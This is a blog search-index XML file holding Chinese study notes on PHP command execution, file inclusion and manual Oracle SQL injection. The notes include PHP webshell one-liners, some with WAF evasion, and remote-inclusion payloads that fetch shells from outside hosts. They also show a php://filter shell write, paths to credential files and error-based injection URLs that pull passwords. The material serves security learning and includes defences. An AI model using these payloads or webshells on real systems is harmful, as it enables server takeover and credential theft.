<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>命令执行原理与实践</title>
      <link href="2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
      <url>2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>RCE：</p><ul><li>remote command execution 远程命令执行，例如ipconfig–显示IP信息</li><li>remote code execution 远程代码执行，例如echo 1–1</li></ul><p>注：文件上传也是RCE漏洞</p><p>PHP中能够执行系统命令的函数：exec、system、passthru、shell_exec、popen</p><pre><code>ping 127.0.0.1 | whoami        //只会执行管道符后面的命令ping 127.0.0.1 || whoami       //执行两个命令ping 127.0.0.1 &amp; whoami        //执行两个命令ping 127.0.0.1 &amp;&amp; whoami       //执行两个命令</code></pre><p>一句话木马工作流程：</p><ul><li>利用eval等危险函数引发远程代码执行，执行任意的PHP代码。</li><li>利用PHP代码中的shell_exec、system等危险函数触发远程命令执行，查看电脑上的所有文件，并且可以执行系统命令，拿到了系统的权限</li></ul><pre><code>菜刀工具一般只能用POST方式传参。万能写法：&lt;?php    @eval($_REQUEST[&#39;cmd&#39;]);   //request可以接受get、post、cookie传的参数?&gt;</code></pre><p>常见代码执行函数：</p><p>assert()  断言。将字符串当作代码执行一次进行判断，判断是否为True。</p><pre><code>&lt;?php    @assert($_GET[&#39;cmd&#39;]);   //使用GET方法需要在URL中手动传参。?&gt;例如：http://127.0.0.1/assert.php?cmd=system(&#39;phpinfo()&#39;)</code></pre><p>eval()：将字符串当做PHP代码执行。</p><p>preg_replace()：对字符串进行正则表达式的查找，如果查找到结果，则将结果替换为正则表达式的内容。（区别preg_match()：进行正则表达式的查找）</p><pre><code>preg_replace(&quot;正则表达式&quot;,&quot;字符串&quot;,&quot;若匹配成功后替换的字符串&quot;)</code></pre><p>create_function()：用户利用该函数创造自定义函数</p><pre><code>/*   注释掉后面的所有代码&lt;?php //?code = 2;&#125;phpinfo();/*$code = $GET_[&#39;code&#39;];$str2 = &#39;echo test&#39;.$code.&quot;;&quot;;echo $str2;//$str2=echo test2;&#125;phpinfo();/*$func = create_function(&#39;$code&#39;,$str2);相当于：function FT($code)&#123;    echo test2;&#125;phpinfo();/*&#125;?&gt;</code></pre><p>array_map函数、print_r()类似于echo，但会产生换行。</p><p>call_user_func </p><p>call_user_func_array</p><p>ASP一句话木马</p><p>wscript.exe文件</p><h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>（1）能够绕过WAF的一句话木马：关键字检测</p><pre><code>assert进行base64编码得YXNzZXJ0$a = YXNzadminZXJ0;$b = str_replace(&#39;admin&#39;,&#39;&#39;,$a);$c = base64_decode($b);  //assert$c($_POST[&#39;cmd&#39;]);</code></pre><p>（2）过狗一句话不能使用eval函数构造。因为eval是一个语言构造器而不是一个函数，不能被可用函数调用。eval只会被当做普通的字符串，而不是当做函数执行，通常使用assert等其他函数。</p><p><strong>可变函数</strong>：即变量名前加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。</p><pre><code class="php">&lt;?php$b = &#39;get&#39;;function get()&#123;    echo 1;&#125;$b();?&gt;//输出结果为1</code></pre><p>（3）可使用异或的方法绕过。在PHP中^符号代表异或，相同为0，相异为1。</p><pre><code>echo &quot; &quot; ^ &quot;a&quot; //空格和a异或，得到结果为Aecho &quot; b&quot; ^ &quot;a &quot; //空格和a异或，b和空格异或，得到结果为AB</code></pre><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>（1）序列化：(serialize)将对象的信息以字符串的形式保存起来。不会对类中的方法进行序列化，只会对类中的属性进行序列化。</p><p>（2）反序列化：将字符串重新创建回对象。</p><p>（3）当该对象需要进行反序列化操作且存在魔术方法时，反序列化会自动执行魔术方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞的原理与实践</title>
      <link href="2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
      <url>2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含漏洞概念与分类"><a href="#文件包含漏洞概念与分类" class="headerlink" title="文件包含漏洞概念与分类"></a>文件包含漏洞概念与分类</h2><h3 id="文件包含的概念"><a href="#文件包含的概念" class="headerlink" title="文件包含的概念"></a>文件包含的概念</h3><p>（1）文件包含指的是在php脚本中使用<strong>include或者require</strong>语句，将一个文件的内容以PHP代码形式插入到另一个php文件中执行。</p><p>（2）使用文件包含可以为开发人员省去大量的工作。开发人员可以创建标准页头、页脚或者菜单文件，然后在网站所有页面使用include或者require等语句将这些文件包含起来。当页头或者菜单需要更新的时候，就只需要更新页头文件或者菜单文件，而不需要对所有的页面进行改动。</p><p>（3）基本语法</p><pre><code class="php">&lt;?phpinclude &#39;filename&#39;;   //orrequire &#39;filename&#39;;?&gt;</code></pre><h3 id="文件包含的关键函数"><a href="#文件包含的关键函数" class="headerlink" title="文件包含的关键函数"></a>文件包含的关键函数</h3><p>（1）文件包含是PHP的一种常见用法，主要由四个函数完成：</p><ul><li>include()、require()、include_once()、require_once()</li><li>当使用这四个函数包含一个新的文件的时候，<strong>该文件将会被当作PHP来执行</strong>，PHP内核并不会在意被包含的文件是什么类型。</li><li>所以如果被包含的是txt文件、图片文件、远程url，也都会被当作php代码执行。这一特性，在攻击者实施攻击时将非常有用。</li></ul><p>（2）想要成功利用文件包含漏洞，需要满足以下两个条件：</p><ul><li>include()等函数通过<strong>动态变量</strong>的方式引入需要包含的文件</li><li><strong>用户能够控制</strong>该动态变量</li></ul><h3 id="文件包含漏洞形成的原因"><a href="#文件包含漏洞形成的原因" class="headerlink" title="文件包含漏洞形成的原因"></a>文件包含漏洞形成的原因</h3><p>（1）在互联网的安全历史中，PHP的文件包含漏洞已经是臭名昭彰的了，因为黑客在各种各样的PHP环境中挖出了数不胜数的文件包含漏洞，而且漏洞都很严重。</p><p>（2）导致文件包含漏洞的主要原因一还是因为用户能够控制include函数的内容，比如下面的例子：</p><pre><code class="php">&lt;?php    include($_GET[file]);?&gt;</code></pre><p>（3）上面的例子中，include函数内的内容采用用户GET请求的参数值。当用户通过GET请求向服务器发送  file=../../etc/passwd时，php将访问/etc/passwd文件，服务器的敏感信息遭到泄露。</p><p>（4）除了自定义输入外，当使用了include、require等函数包含文件的时候，<strong>被包含的文件会被服务器当作PHP代码来执行，PHP的内核并不会在意该文件是什么类型，即使是图片也是可以被当作php代码来执行。</strong>黑客通常会将文件包含漏洞与上传结合在一起，上传内容带有php语句的图片，在通过文件包含漏洞包含该图片，达到执行php代码的目的，控制服务器。</p><h3 id="文件包含漏洞的分类"><a href="#文件包含漏洞的分类" class="headerlink" title="文件包含漏洞的分类"></a>文件包含漏洞的分类</h3><p>（1）PHP文件包含漏洞有两种类型：</p><ul><li>本地文件包含（Local File Inclusion，简称LFI）</li><li>远程文件包含（Remote File Inclusion，简称RFI）</li><li>其中：本地文件包含是能够<strong>打开并包含本地文件的漏洞</strong><ul><li>如下面的代码，就存在本地文件包含（LFI）：</li><li>用户能够控制参数file，当file的值为“../../../flag”时，PHP将访问d:/flag文件，直接导致服务器敏感信息泄露 。</li></ul></li></ul><pre><code class="php">&lt;?php$filename = $_GET[&#39;file&#39;]; if(file_exists(&#39;D:/phpstudy/www/file_include/&#39;.$filename))&#123;    include &#39;D:/phpstudy/www/file_include/&#39;.$filename;&#125;?&gt;</code></pre><p>（2）远程文件包含漏洞（RFI）</p><ul><li>在本地文件包含的基础上，将PHP配置（php.ini）文件中的allow_url_include选项修改为ON（默认为OFF），allow_url_fopen选项设置为ON</li><li>include/require函数即可以加载远程的文件，比如下面的代码:</li></ul><pre><code class="php">&lt;?php     $basePath = $_GET[&#39;path&#39;];    require_once $basePath;  ?&gt;</code></pre><ul><li>攻击者可以构造：?path=<a href="http://attacker/shell.txt%EF%BC%8Cshell.txt%E6%96%87%E4%BB%B6%E5%9C%A8%E6%94%BB%E5%87%BB%E8%80%85%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E9%9D%A2%EF%BC%8C%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E4%B8%BA%E6%81%B6%E6%84%8F%E7%9A%84php%E4%BB%A3%E7%A0%81%E3%80%82%E6%9C%80%E7%BB%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E9%99%85%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BA%86:require_once">http://attacker/shell.txt，shell.txt文件在攻击者自己的服务器上面，文件内容为恶意的php代码。最终服务器实际上执行了:require_once</a> ‘<a href="http://attacker//shell.txt&#39;">http://attacker//shell.txt&#39;</a>  </li></ul><h2 id="文件包含漏洞的检测与利用"><a href="#文件包含漏洞的检测与利用" class="headerlink" title="文件包含漏洞的检测与利用"></a>文件包含漏洞的检测与利用</h2><h3 id="文件包含漏洞检测"><a href="#文件包含漏洞检测" class="headerlink" title="文件包含漏洞检测"></a>文件包含漏洞检测</h3><p><img src="https://i.loli.net/2021/05/14/9nwOqBiUgouplEz.png" alt="image-20210514225155960"></p><p>修改page参数后页面发生变化，存在文件包含漏洞。</p><p><img src="https://i.loli.net/2021/05/14/ZE2kUawNeMdF47z.png" alt="image-20210514225238935"></p><h3 id="LFI的利用"><a href="#LFI的利用" class="headerlink" title="LFI的利用"></a>LFI的利用</h3><p>（1）本地文件包含：包含在D盘根目录下的flag.txt文件</p><p><img src="https://i.loli.net/2021/05/14/aeLJBdyvNxsMmc2.png" alt="image-20210514225853875"></p><p>（2）Windows下的敏感文件路径</p><ul><li>c:\windows\my.ini     \安装mysql时会将root密码写入该文件</li><li>c:\windows\system32\config\sam  \存放windows管理员登陆密码</li><li>c:\windows\system32\inetsrv\MetaBase.xml  \存放iis配置文件</li><li>c:\tomcat5.0\conf\resin.conf  tomcat存放密码的位置</li></ul><p>（3）linux下的敏感文件路径</p><ul><li>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</li><li>/usr/local/app/php5/lib/php.ini   //PHP相关设置</li><li>/etc/sysconfig/network-scripts/ifcfg-eth0  //查看IP</li><li>/etc/my.cnf   //mysql的配置文件</li><li>/etc/redhat-release //系统版本</li><li>/etc/rc.local   有时可以读出来apache的路径</li><li>/etc/passwd   /etc/shadow     //密码存放文件</li></ul><h3 id="RFI的利用"><a href="#RFI的利用" class="headerlink" title="RFI的利用"></a>RFI的利用</h3><p><img src="https://i.loli.net/2021/05/14/9VvulZUoAiexRnK.png" alt="image-20210514230206504"></p><h2 id="PHP封装协议与文件包含"><a href="#PHP封装协议与文件包含" class="headerlink" title="PHP封装协议与文件包含"></a>PHP封装协议与文件包含</h2><h3 id="file协议——file"><a href="#file协议——file" class="headerlink" title="file协议——file://"></a>file协议——file://</h3><p>（1）file协议用来<strong>访问本地文件系统</strong></p><ul><li>file://这个伪协议可以展示“本地文件系统”，当存在某个用户可控制、并得以访问执行的输入点时，可以尝试输入file://去试图获取本地磁盘文件。</li><li>以DVWA的文件包含漏洞为例，获取存在D盘根目录下的flag.txt文件</li></ul><p><img src="https://i.loli.net/2021/05/14/UokyjZe72VtSb3R.png" alt="image-20210514230635949"></p><p>（2）file://这个协议后需跟<strong>文件的绝对路径。</strong></p><ul><li>allow_url_fopen （需要在php.ini中设置为ON）：本选项激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象，例如文件。默认的封装协议提供用 ftp 和 http 协议来访问远程文件。</li></ul><h3 id="HTTP协议——http-、https"><a href="#HTTP协议——http-、https" class="headerlink" title="HTTP协议——http://、https://"></a>HTTP协议——http://、https://</h3><p>（1）http:// 、https:// — 访问 HTTP(s) 网址</p><p>（2）允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 HTTP 请求会附带一个 Host: 头，用于兼容基于域名的虚拟主机。 如果在你的 php.ini 文件中或字节流上下文（context）配置了 user_agent 字符串，它也会被包含在请求之<br>中。</p><ul><li>数据流允许读取资源的 body，而 headers 则储存在了 $http_response_header 变量里。</li></ul><p>（3）如果需要知道文档资源来自哪个 URL（经过所有重定向的处理后）， 需要处理数据流返回的系列响应报头（response headers）。</p><p>（4）注：如果你设置了 php.ini 中的 from 指令， 不覆盖上下文（Context）选项和参数设置.。</p><p>（5）用法：</p><pre><code>http://域名（IP地址）http(s)://example.comhttp(s)://example.com/file.php?var1=val1&amp;var2=val2http(s)://user:password@example.com</code></pre><p><img src="https://i.loli.net/2021/05/15/KeoqBEuJCrF3DVT.png" alt="image-20210515185029881"></p><h3 id="PHP封装协议"><a href="#PHP封装协议" class="headerlink" title="PHP封装协议"></a>PHP封装协议</h3><p>（1）利用<strong>php伪协议</strong>可以使得<strong>本地文件包含</strong>执行自定义的php代码。PHP伪协议（需要allow_url_include为on </p><ul><li>php://input</li></ul><pre><code>?page=php://input使用POST方法提交:&lt;?php php代码 ?&gt;</code></pre><p><img src="https://i.loli.net/2021/05/15/1LRsSmOb5GkMAho.png" alt="image-20210515190257031"></p><ul><li>data://</li></ul><pre><code>?page=data:text/plain,&lt;?php php代码 ?&gt;</code></pre><p><img src="https://i.loli.net/2021/05/15/sBYx9LjgWPMlcbi.png" alt="image-20210515190724316"></p><p>（2）data:text/plain,&lt;?php phpinfo();?&gt;可使用base64编码。</p><pre><code>data:text/plain;base64,base64编码的payload//&lt;?php phpinfo();?&gt;经过base64编码后得到：PD9waHAgcGhwaW5mbygpOz8+//最后末尾的加号需要再进行URL编码为%2B或%2bdata:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src="https://i.loli.net/2021/05/15/yWwvALeXEPcQTKx.png" alt="image-20210515191408541"></p><h3 id="php协议——php-filter"><a href="#php协议——php-filter" class="headerlink" title="php协议——php://filter"></a>php协议——php://filter</h3><p>（1）php://filter 是一种元封装器， 用于数据流打开时的筛选过滤应用。 </p><p>（2）用法：php://filter/[read/write=&lt;读/写的编码&gt;]/resource=&lt;要读或者写的文件&gt;</p><ul><li>php://filter/read=xxx/resource=ooo</li><li>php://filter/write=xxx/resource=ooo</li><li>xxx :转换过滤器 –&gt; 读或写所要做的编码操作</li><li>ooo :字符串过滤器 – &gt; 要读或者写的文件</li></ul><p>（3）编码操作：</p><ul><li>base64编码：base64可以把内容编码成一行字符串</li></ul><pre><code>convert.base64-encodeconvert.base64-decode</code></pre><ul><li>rot13编码：将所有字符串转换为rot13格式，不能转成一行</li></ul><pre><code>string.rot13</code></pre><p>（4）a.txt文件的内容如下，将该文件放置在D盘根目录下。</p><pre><code class="php">&lt;?php echo &quot;This is a.php file ...&quot;;//flag&#123;This_Is_Fl19&#125;?&gt;</code></pre><p>（5）使用php://filter 读取文件a.txt （不使用编码，没有读取完整）</p><pre><code>php://filter/read=/resource=../../../../../../../a.txta.txt</code></pre><p><img src="https://i.loli.net/2021/05/15/MYFzOfNBpRxXE1H.png" alt="image-20210515192923993"></p><p>（6）使用php://filter 读取文件a.txt （使用base64编码）</p><pre><code>php://filter/read=convert.base64-encode/resource=../../../../../../../a.txta.txt</code></pre><p><img src="https://i.loli.net/2021/05/15/9aM2d7Y1tDGWEwV.png" alt="image-20210515193728317"></p><p>将得到的base64编码字符串解码后就是完整的文件内容。</p><p><img src="https://i.loli.net/2021/05/15/Zrdm75hFoVlNv3w.png" alt="image-20210515193950537"></p><p>（7）file.php</p><pre><code>&lt;?file_put_contents($_GET[&#39;file&#39;],$_GET[&#39;C&#39;]);?&gt;</code></pre><p>使用php://filter 写shell文件（使用base64编码）</p><pre><code>php://filter/write=convert.base64-decode/resource=shell.php&amp;c=PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk/Pg==</code></pre><h2 id="文件包含漏洞的防范"><a href="#文件包含漏洞的防范" class="headerlink" title="文件包含漏洞的防范"></a>文件包含漏洞的防范</h2><p>（1）在php代码中禁止0字节(\0)，防止攻击者截断攻击。如：</p><pre><code class="php">&lt;?phpFunction getVar($page)&#123;    $value = isset($_GET[$page]) ? $_GET[$page] : null;    if (is_string($value))&#123;        $value = str_replace(&quot;\0&quot;,&#39;&#39;, $value);    &#125;&#125;?&gt;</code></pre><ul><li>禁止0字节的目的：</li></ul><pre><code>include &#39;/home/wwwrun/&#39; . $page . &#39;.php&#39;;</code></pre><ul><li>为了安全起见，开发人员通常以路径拼接的方式包含文件。当攻击者尝试提交：</li></ul><pre><code>?page=../../etc/passwd </code></pre><ul><li>这时候代码相当于：</li></ul><pre><code>include &#39;/home/wwwrun/../../etc/passwd.php&#39;;</code></pre><ul><li>被包含的文件实际上是“/etc/passwd.php”，但这个文件其实是不存在的。这时候攻击者可以在最后加上一个 0 字节，就能截断page变量之后的字符串：</li></ul><pre><code>../../etc/passwd\0</code></pre><ul><li>通过web输入，只需urlencode编码，就能绕过拼接限制实现文件包含：</li></ul><pre><code>?page=../../etc/passwd%00</code></pre><p>（2）在php.ini中配置open_basedir,限制PHP仅能打开某个文件夹的文件，使攻击者无法通过../等方式遍历服务器文件。</p><p><img src="https://i.loli.net/2021/05/15/rKpk56B1RtaM4bn.png" alt="image-20210515200419998"></p><p>（3）尽量避免包含动态的变量，尤其是用户可以控制的变量，可以通过枚举实现。比如：</p><pre><code>&lt;?php$file = $_GET[&#39;page&#39;];//枚举可能的值Switch ($page) &#123;    case &#39;include.php&#39;:    case &#39;file1&#39;:    case &#39;file2&#39;:    case &#39;file3&#39;:        include &#39;C:\phpStudy\WWW\dvwa\vulnerabilities\fi\&#39; . $page . &#39;.php&#39;;        break;    default:        include &#39;C:\phpStudy\WWW\dvwa\vulnerabilities\fi\include.php&#39;&#125;?&gt;</code></pre><p>（4）将PHP配置选项allow_url_include置为off，禁止include/require等函数加载远程文件。</p><p><img src="https://i.loli.net/2021/05/15/6er8vdP3f1JmbVy.png" alt="image-20210515200540197"></p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>PHP 程序在执行前，就会先读入 require 所指定引入的文件；</p><p>PHP 程序网页在读到 include 的文件时，才将它读进来 。</p><p>require引入的文件都会被当做PHP代码执行。</p><pre><code></code></pre><h3 id="返回上一级目录"><a href="#返回上一级目录" class="headerlink" title="返回上一级目录"></a>返回上一级目录</h3><p>../</p><p>访问上三级目录下的flag.txt文件：../../../flag.txt</p><p><strong>注：当不知道目标网站的目录结构时，可以多写几个../。因为在根目录下使用../返回上一级目录依然会在根目录下。</strong></p><h3 id="本地文件包含（LFI"><a href="#本地文件包含（LFI" class="headerlink" title="本地文件包含（LFI)"></a>本地文件包含（LFI)</h3><p>（1）效果：能够访问本地的所有文件（没有根目录的限制）。如果没有根目录的限制，则只能访问根目录下的所有文件</p><p>（2）危害：</p><ul><li>文件泄露</li><li>结合文件上传，上传一个一句话木马的文本文件，然后通过文件包含的方法，成功访问木马并其控制服务器。</li></ul><h2 id="远程文件包含（RFI"><a href="#远程文件包含（RFI" class="headerlink" title="远程文件包含（RFI)"></a>远程文件包含（RFI)</h2><p>（1）LFI只能包含本地文件，RFI可以包含<strong>以http</strong>等形式访问到的互联网文件。</p><p><a href="http://127.0.0.1/php/b.php?website=http://60.205.1.62/webshell.php">http://127.0.0.1/php/b.php?website=http://60.205.1.62/webshell.php</a></p><p>（2）危害：可以直接通过包含互联网上的恶意代码，进而控制服务器。</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>file</p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>php，可以读写服务器上的文件</p><p>mysql</p><p>javascript</p><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>由于使用post传参，无法使用菜刀连接一句话木马</p><pre><code class="php">website=php://input  #使用PHP协议向PHP文件中输入,输入的内容用 POST方式提交[Post data] &lt;?php eval(system(&#39;dir&#39;)) ?&gt;</code></pre><h3 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h3><p>使用get方式传参，可以使用菜刀连接一句话木马</p><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>1.通常使用php://filter完成读取文件的操作。</p><p>2.通常使用data:text/plain;完成写文件的操作。</p><h2 id="文件包含漏洞网站渗透思路"><a href="#文件包含漏洞网站渗透思路" class="headerlink" title="文件包含漏洞网站渗透思路"></a>文件包含漏洞网站渗透思路</h2><p><strong>前提</strong>：</p><p>1.需要知道网站的目录结构:可借助中间件配置错误。</p><p>2.需要知道PHP对于这两个关键函数（allow_url_include和allow_url_fopen）是否启用。可以通过：”php.ini”或”phpinfo.php”或”phpinfo()”查看这两个函数是否启用。</p><p><strong>思路</strong></p><p>1.allow_url_include和allow_url_fopen都为Off</p><ul><li>尝试获取敏感信息</li><li>尝试结合文件上传获取木马</li></ul><p>2.allow_url_fopen为On时</p><ul><li>使用file://伪协议可以突破对于网站根目录的限制</li><li>尝试结合文件上传获取木马</li></ul><p>3.allow_url_include为On时</p><ul><li><p>尝试php伪协议读数据</p></li><li><p>使用HTTP协议远程文件包含木马获取权限</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle的手工注入</title>
      <link href="2021/04/29/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/Oracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/29/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/Oracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Oracle获取数据的基本技巧"><a href="#Oracle获取数据的基本技巧" class="headerlink" title="Oracle获取数据的基本技巧"></a>Oracle获取数据的基本技巧</h2><p>（1）特殊表</p><ul><li>dual表：是一个虚拟的表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。</li><li>user_tables表，该表的table_name列存放着当前数据库的所有表名。</li><li>user_tab_columns表，该表的column_name 存放着表的所有列名。</li></ul><p>（2）Oracle查询需要带上表名，如select * from xxx (有一个万能的表：dual表)</p><p>（3）单行子查询返回多行需使用 where rownum=1来规范</p><ul><li>rownum 是伪序列数，总是从1开始</li><li>oracle数据库从数据文件或缓冲区中读取数据的顺序。</li><li>它取得第一条记录则rownum值为1，第二条为2，依次类推。</li></ul><h2 id="Oracle的基本知识"><a href="#Oracle的基本知识" class="headerlink" title="Oracle的基本知识"></a>Oracle的基本知识</h2><h3 id="内置语句"><a href="#内置语句" class="headerlink" title="内置语句"></a>内置语句</h3><p>（1）获取数据类</p><ul><li>获取数据库版本</li></ul><pre><code class="sql">* SQL&gt; select banner from sys.v_$version where rownum=1;BANNER--------------------------------------------------------------------------------Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</code></pre><ul><li>获取当前会话的登录名</li></ul><pre><code>SQL&gt; select user from dual;USER------------------------------SYSTEM</code></pre><ul><li>获取所有用户名</li></ul><pre><code>* SQL&gt; select username from dba_users;USERNAME------------------------------SYSSYSTEMSYSMANSCOTT...</code></pre><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>（1）lenth()用法：lenth(char)  ：返回字符串的长度</p><p>（2）COUNT(<em>)用法：COUNT(\</em>) 函数，返回在给定的选择中被选的行数</p><p>（3）ascii()用法： ascii(char) 表示将字符转换为ASCII码</p><p>（4）SUBSTR用法：SUBSTR( 源字符串, 查找起始位置, [ 长度 ] )返回值为源字符串中指定起始位置和长度的字符串。</p><p>（5）INSTR用法：INSTR(源字符串, 要查找的字符串, 从第几个字符开始, 要找到第几个匹配的序号)返回找到的位置，如果找不到则返回0. 默认查找顺序为从左到右。当起始位置为负数的时候，从右边开始查找。若起始位置为0，返回值为0。</p><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><p>使用 || 来进行字符串的拼接</p><pre><code>SQL&gt; select &#39;a&#39;||&#39;d&#39;||&#39;m&#39;||&#39;i&#39;||&#39;n&#39; from dual;&#39;A&#39;||-----adminSQL&gt; select chr(97)||chr(100)||chr(109)||chr(105)||chr(110) from dual;CHR(9-----admin</code></pre><h3 id="在单行中输出多行信息"><a href="#在单行中输出多行信息" class="headerlink" title="在单行中输出多行信息"></a>在单行中输出多行信息</h3><p>使用sys.stragg()函数(11g+)来在单行中获取所有行信息</p><pre><code class="sql">SQL&gt; select username from all_users;USERNAME------------------------------SQLINJECTIONBIPMSCOTT…… （结果多行）SQL&gt; select sys.stragg(distinct username||&#39;;&#39;) from all_users; （多行结果以一行显示，并用‘;’隔开）SYS.STRAGG(DISTINCTUSERNAME||&#39;;&#39;)--------------------------------------------------------------------------------ANONYMOUS;APEX_030200;APEX_PUBLIC_USER;APPQOSSYS;BI;CTXSYS;DBSNMP;DIP;EXFSYS;FLOWS_FILES;HR;IX;MDDATA;MDSYS;MGMT_VIEW;OE;OLAPSYS;ORACLE_OCM;ORDDATA;ORDPLUGINS;ORDSYS;OUTLN;OWBSYS;OWBSYS_AUDIT;PM;SCOTT;SH;SI_INFORMTN_SCHEMA;SPATIAL_CSW_ADMIN_USR;SPATIAL_WFS_ADMIN_USR;SQLINJECTION;SYS;SYSMAN;SYSTEM;WMSYS;XDB;XS$NULL;</code></pre><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>（1）判断数据库列数：</p><pre><code>order by N</code></pre><p>（2）判断数据回显位置</p><pre><code>union select null,null,null,null,...N from dual</code></pre><p>（3）获取任意1行数据</p><pre><code>rownum=1逐行排除</code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>（1）使用条件：HTTP返回包中含有原始数据库的报错信息。</p><p>（2）Oracle报错注入——类型转换错误和报错函数。</p><p>（3）1=utl_inaddr.get_host_name((SQL语句))</p><p>（4）查询结果： ORA-29257: 未知的主机 结果</p><p>（5）获取表名信息：</p><pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select table_name from user_tables where rownum=1)) --</code></pre><p>（6）开始用不等于&lt;&gt;来枚举数据，获取除T_USER表外更多的获取关键表名信息，当显示无效数字，说明除已经枚举完所有的表。</p><pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name(table_name&lt;&gt;&#39;T_USER&#39;)) --</code></pre><p>（7）获取表T_USER中的列，先获取伪列为1的字段名。</p><pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1)) --</code></pre><p>（8）枚举表T_USER中的列，获取除列‘SUSER’外伪列为1的字段名。</p><pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 and column_name &lt;&gt; &#39;SUSER&#39;)) --</code></pre><p>（9）枚举表T_USER中的列，获取除列‘SUSER’、’SPWD’外伪列为1的字段名。</p><pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 and column_name &lt;&gt; &#39;SUSER&#39; and column_name &lt;&gt;&#39;SPWD&#39;)) --</code></pre><p>（10）枚举表T_USER中的列，获取除列‘SUSER’、’SPWD’、’SNAME’外伪列为1的字段名。</p><pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 and column_name &lt;&gt; &#39;SUSER&#39; and column_name &lt;&gt;&#39;SPWD&#39;)) --</code></pre><p>（11）获取列‘SUSER’、’SPWD’、’SNAME’的值</p><pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select sys.stragg(SUSER)||sys.stragg(SPWD)||sys.stragg(SNAME) from T_USER))-- </code></pre><p>URL编码：</p><pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select sys.stragg(SUSER)%7C%7Csys.stragg(SPWD)%7C%7Csys.stragg(SNAME) from T_USER))-- </code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>（1）使用条件：HTTP返回包中没有执行结果的数据和报错信息。</p><p>（2）Oracle盲注核心——字符串截取函数、ascii转换函数、条件判断语句。</p><pre><code 